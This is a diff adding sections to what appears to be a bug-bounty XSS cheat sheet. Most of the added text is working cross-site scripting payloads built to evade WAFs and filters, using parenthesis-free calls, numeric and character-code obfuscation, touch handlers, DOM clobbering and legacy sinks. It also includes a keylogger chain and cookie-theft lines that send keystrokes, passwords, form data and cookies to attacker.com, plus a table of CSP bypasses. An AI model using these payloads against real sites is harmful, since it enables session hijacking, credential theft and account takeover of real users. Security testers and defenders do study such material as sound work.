@@ -787,3 +787,325 @@ Note: data: scheme for SW registration is Chrome-only; requires HTTPS origin
 Impact: Medium-High — converts self-XSS + CSRF into stored XSS
 Technique used in: multiple HackerOne reports where self-XSS alone was N/A'd
 ```
+
+
+---
+
+## XSS Without Parentheses
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAF / regex rules blocking `()` function call syntax
+**Bypass logic:** JavaScript provides multiple ways to invoke functions without the `(` `)` characters — template literals, error handler assignment, operator overloading, and prototype manipulation.
+**Attack chain:** XSS → cookie/token exfil → account takeover
+
+**Payloads:**
+```javascript
+// Template literal invocation — works anywhere alert() works
+alert`1`
+confirm`document.cookie`
+
+// Error handler + throw — no parens anywhere
+onerror=alert;throw 1
+<img src=x onerror="onerror=alert;throw 1">
+
+// Destructuring + throw
+{onerror=alert}throw 1
+
+// window.name cross-page relay (set name first, then eval via location)
+// Page 1 (attacker controlled): window.name = "alert(document.cookie)"
+// Page 2 (victim, via DOM XSS): location = name
+<script>location=name</script>
+
+// Reflect.apply.call with template string
+Reflect.apply.call`${alert}${undefined}${[1]}`
+
+// Symbol.hasInstance prototype override
+Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29" instanceof[]
+
+// DOMMatrix property chain → javascript: navigation
+x=new DOMMatrix;matrix=alert;x.a=1;location='javascript'+':'+x
+
+// Array prototype sort trick
+[].sort.call`${alert}1`
+```
+**Source:** https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
+
+---
+
+## Number-Based Eval Obfuscation (toString Base Conversion)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF / keyword filters blocking `alert`, `confirm`, `prompt`, `eval` as plaintext strings
+**Bypass logic:** JavaScript numbers have a `.toString(radix)` method. Certain numbers in certain bases spell out JavaScript function names. The function is then called via `eval()` or bracket notation — all as numeric literals that bypass string-matching WAF rules.
+**Attack chain:** XSS → arbitrary JS execution → cookie/token exfil → ATO
+
+**Payloads:**
+```javascript
+// 8680439 in base 30 = "confirm", 983801 in base 36 = "1"
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+
+// Generic approach — find the number for your function:
+// In browser console: parseInt("alert", 36) → 17302
+
+// Chained with hex eval
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+// \x61=a \x6c=l \x65=e \x72=r \x74=t → alert(1)
+
+// Combined obfuscation
+<script>
+var f=eval,a=8680439..toString(30);
+f(a)(document['cookie'])
+</script>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Touch Event Handler XSS (Mobile WAF Bypass)
+
+**Type:** reflected / stored
+**Filter bypassed:** WAF rules blocking mouse-based event handlers (`onclick`, `onmouseover`, `onmouseenter`) while ignoring mobile touch events
+**Bypass logic:** Touch events (`ontouchstart`, `ontouchend`, `ontouchmove`) are mobile-specific handlers absent from many WAF blocklists. On touch-capable devices or emulators they fire without click interaction.
+**Attack chain:** XSS → fires on mobile page load/swipe → cookie theft → ATO
+
+**Payloads:**
+```html
+<!-- Fires on any touch contact with screen -->
+<body ontouchstart=alert(document.cookie)>
+
+<!-- Fires when touch ends (finger lifted) -->
+<body ontouchend=alert(1)>
+
+<!-- Fires during drag/swipe motion -->
+<body ontouchmove=alert(1)>
+
+<!-- With exfil payload on real touch device -->
+<body ontouchstart="fetch('https://attacker.com/c?d='+document.cookie)">
+
+<!-- Combined desktop+mobile fallback -->
+<div ontouchstart=alert(1) onclick=alert(1) onmouseover=alert(1)>tap or hover</div>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## String.fromCharCode Keyword Obfuscation
+
+**Type:** reflected / stored / DOM
+**Filter bypassed:** WAF / sanitizer keyword detection blocking `alert`, `confirm`, `document`, `cookie`, `eval` as plaintext
+**Bypass logic:** `String.fromCharCode()` converts character code arrays back to strings at runtime, never exposing blocked keywords in source. Works in any JavaScript execution context.
+**Attack chain:** XSS → bypasses keyword WAF → executes cookie theft → session hijack
+
+**Payloads:**
+```javascript
+// alert(1) via fromCharCode
+<script>alert(String.fromCharCode(49))</script>
+
+// Full cookie exfil without any blocked keywords in source
+<img src=x onerror="
+  var c=String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101);
+  new Image().src='//attacker.com/?'+eval(c)
+">
+// String.fromCharCode(100,111,...) = 'document.cookie'
+
+// Compact eval form
+<script>
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+// = eval('alert(1)')
+</script>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## DOM Clobbering → XSS
+
+**Type:** DOM / stored
+**Filter bypassed:** Sanitizers / CSP (no `script` execution required for setup); app logic that trusts DOM globals as safe
+**Bypass logic:** HTML elements with `id` attributes create named global variables on `window`. By injecting innocuous HTML (anchor, form, input tags — often allowed by sanitizers), an attacker overwrites JavaScript global variables that app code reads — causing those reads to return attacker-controlled values (URLs, HTML strings), which then flow into dangerous sinks.
+**Attack chain:** HTML injection (zero JS, passes sanitizer) → clobber global → app reads clobbered value → loads attacker script / navigates to `javascript:` URI → XSS → ATO
+
+**Payloads:**
+```html
+<!-- Clobber window.x with anchor href -->
+<a id=x href="javascript:alert(1)">click</a>
+<!-- Code: if(x) location = x  →  navigates to javascript:alert(1) -->
+
+<!-- Clobber window.x.y (nested) via form + input -->
+<form id=x><input id=y name=z value="javascript:alert(1)"></form>
+<!-- Code: config.url = x.y.z  →  loads javascript: URI -->
+
+<!-- base-uri clobbering — forces relative script loads to attacker domain -->
+<base href="https://attacker.com/">
+<!-- Any relative <script src="/js/app.js"> now loads from attacker.com -->
+
+<!-- Double-anchor trick for property.property (HTMLCollection) -->
+<a id=csrf><a id=csrf name=token href="//attacker.com/steal">
+<!-- window.csrf.token → HTMLCollection → first anchor → href = attacker URL -->
+
+<!-- Clobber document.forms action -->
+<form name=login><input name=action value="https://attacker.com/phish"></form>
+<!-- Code reading document.forms.login.action gets attacker URL -->
+
+<!-- Clobber a security-check variable (sanitizeConfig.allowedDomain) -->
+<a id=sanitizeConfig href="https://evil.com/evil.js"></a>
+<!-- Code: loadScript(sanitizeConfig.href) → loads attacker JS -->
+```
+**Source:** https://portswigger.net/research/dom-clobbering-strikes-back ; https://research.securitum.com/dom-clobbering/
+
+---
+
+## Browser-Specific Legacy Sinks
+
+**Type:** DOM / reflected
+**Filter bypassed:** Modern-browser-only scanners; WAF rules tuned to current browser APIs, missing IE/legacy-Firefox sinks
+**Bypass logic:** IE and legacy Firefox expose execution sinks absent from modern browsers. Corporate intranets, banking portals, and internal tooling often still run IE or legacy Firefox — making these sinks viable in enterprise/intranet bug bounty scope.
+**Attack chain:** XSS via legacy sink → arbitrary JS execution → session theft → ATO
+
+**Payloads:**
+```javascript
+// execScript — IE 6+, equivalent to eval()
+window.execScript("alert(document.cookie)");
+<script>execScript("alert(1)")</script>
+
+// setImmediate — IE 10+, string arg executes as code
+setImmediate("alert(1)");
+
+// crypto.generateCRMFRequest — old Firefox, 5th param executes as JS
+crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use');
+
+// ScriptElement.text — write code directly to script element (IE + modern)
+var s=document.createElement('script');
+s.text='alert(1)';
+document.body.appendChild(s);
+
+// ScriptElement.innerText (all except old Firefox)
+var s=document.createElement('script');
+s.innerText='alert(1)';
+document.body.appendChild(s);
+
+// ScriptElement.src — load remote script via DOM sink
+var s=document.createElement('script');
+s.src='https://attacker.com/xss.js';
+document.head.appendChild(s);
+```
+**Source:** https://github.com/wisec/domxsswiki/wiki/Direct-Execution-Sinks
+
+---
+
+## XSS Keylogger Chain
+
+**Type:** stored / DOM
+**Filter bypassed:** n/a — post-execution payload that exfils real-time keystrokes invisibly
+**Bypass logic:** After achieving XSS, inject a persistent `keypress`/`submit` listener that streams each keystroke or full form submission to the attacker's server. Captures passwords typed after XSS fires — including re-authentication prompts — bypassing 2FA if credentials are reused.
+**Attack chain:** Stored XSS → invisible keylogger injected → victim types password → credentials exfilled → full account takeover (bypasses 2FA)
+
+**Payloads:**
+```javascript
+// Basic per-keystroke exfil (self-removes img tag)
+<img src=x onerror='
+  document.onkeypress=function(e){
+    fetch("https://attacker.com/k?k="+String.fromCharCode(e.which))
+  };this.remove();
+'>
+
+// Batched exfil every 2 seconds (less noisy)
+<svg onload="
+  var keys='';
+  document.addEventListener('keypress',function(e){keys+=e.key});
+  setInterval(function(){
+    if(keys){fetch('https://attacker.com/k?b='+btoa(keys));keys='';}
+  },2000);
+">
+
+// Password field specific (minimal noise)
+<script>
+document.addEventListener('keypress',function(e){
+  if(e.target.type==='password'){
+    fetch('https://attacker.com/pwd?k='+encodeURIComponent(e.key));
+  }
+});
+</script>
+
+// Full form capture on submit
+<script>
+document.addEventListener('submit',function(e){
+  var data=new FormData(e.target);
+  fetch('https://attacker.com/form',{
+    method:'POST',mode:'no-cors',
+    body:JSON.stringify(Object.fromEntries(data))
+  });
+});
+</script>
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Octal Encoding Protocol Bypass
+
+**Type:** reflected / DOM
+**Filter bypassed:** WAF / sanitizer string-matching on `javascript:` in `href`/`src` attributes without decoding octal first
+**Bypass logic:** JavaScript string literals support octal escape sequences (`\1nn`). Encoding `javascript:` in octal produces a string that evaluates identically but is invisible to string-pattern filters. Works in JS contexts where the string is later passed to a URL sink or `eval`.
+**Attack chain:** XSS via href injection → octal-encoded `javascript:` URI bypasses filter → JS execution → cookie theft
+
+**Payloads:**
+```javascript
+// Octal of "javascript:alert(1)": j=\152 a=\141 v=\166 a=\141 s=\163 c=\143
+//  r=\162 i=\151 p=\160 t=\164 :=\072
+<a href="\152\141\166\141\163\143\162\151\160\164\072alert(1)">click</a>
+
+// In JS eval context
+eval('\152\141\166\141\163\143\162\151\160\164\072alert(1)')
+
+// Mixed octal + hex + entity
+<a href="java\x73cript:alert(1)">   // \x73 = 's'
+<a href="java&#x73;cript:alert(1)">  // HTML entity for 's'
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Bypass Matrix (Updated 2026-05-24)
+
+### New Entries — Techniques Added 2026-05-24
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| `()` parentheses blocked | Template literal invocation | `alert\`1\`` |
+| `()` blocked | Error handler + throw | `<img src=x onerror="onerror=alert;throw 1">` |
+| `()` blocked | `Reflect.apply.call` + template | `Reflect.apply.call\`${alert}${undefined}${[1]}\`` |
+| `()` + keywords blocked | `Symbol.hasInstance` + instanceof | `Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29" instanceof[]` |
+| `()` + keywords blocked | `DOMMatrix` property chain | `x=new DOMMatrix;matrix=alert;x.a=1;location='javascript'+':'+x` |
+| Keyword WAF (`alert`,`confirm`) | `Number.toString(base)` conversion | `eval(8680439..toString(30))(983801..toString(36))` |
+| Keyword WAF | `String.fromCharCode` | `alert(String.fromCharCode(49))` |
+| Mouse event handler WAF | Touch event handlers | `<body ontouchstart=alert(1)>` |
+| All script injection blocked | DOM clobbering (HTML-only) | `<a id=x href="javascript:alert(1)">` → code reads `window.x` |
+| `javascript:` string match | Octal encoding | `\152\141\166\141\163\143\162\151\160\164\072alert(1)` |
+| Modern browser tooling only | Legacy IE sink | `execScript("alert(1)")` |
+
+### New Sinks Documented 2026-05-24
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `window.execScript()` | IE 6+ | String arg executes as JScript |
+| `setImmediate()` | IE 10+ | String arg executes as code |
+| `crypto.generateCRMFRequest()` | Old Firefox | 5th param is executable |
+| `ScriptElement.text` | IE + modern | Direct code write to script element |
+| `ScriptElement.innerText` | All except old Firefox | Alternate script text write |
+| `document.forms[n].action` | DOM clobbering | Clobbered via `<form name=...>` |
+| `window.name` | Cross-page | Attacker sets name; victim: `location=name` |
+| `document.onkeypress` | Post-XSS chain | Real-time keystroke exfil |
+
+### CSP Configurations Seen & Weaknesses (2026)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `script-src 'self'` | Whitelists same-origin JSONP | Find JSONP endpoint on target |
+| `script-src cdn.example.com` | CDN hosts Angular 1.x / jQuery | Script gadget via `ng-app` or `$.globalEval` |
+| `script-src 'nonce-XYZ'` | Nonce reflected in page source | Read nonce, inject `<script nonce=...>` |
+| `script-src 'strict-dynamic'` | Trusted scripts can create scripts | Gadget in loaded library |
+| No `base-uri` directive | `<base>` tag injection | `<base href="//attacker.com/">` hijacks relative loads |
+| No `object-src` directive | Plugin/object execution | `<object data="javascript:alert(1)">` |
+| `default-src 'none'` + no `form-action` | Form POST exfil | POST form to attacker (no fetch needed) |
+| `require-trusted-types-for 'script'` | Permissive policy or prototype pollution | Pollute `__proto__` to inject into TT policy |
